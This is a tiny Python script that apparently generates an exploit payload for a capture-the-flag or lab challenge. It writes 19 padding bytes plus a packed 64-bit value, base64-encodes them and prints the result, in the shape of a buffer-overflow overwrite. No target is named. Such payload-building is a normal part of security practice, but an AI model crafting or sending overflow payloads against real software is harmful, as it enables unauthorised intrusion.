
import sys
import struct
import base64

buf = b'wwwwwwwwwwwwwwwwwww'
buf += struct.pack('<Q', 6662611570678574482)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
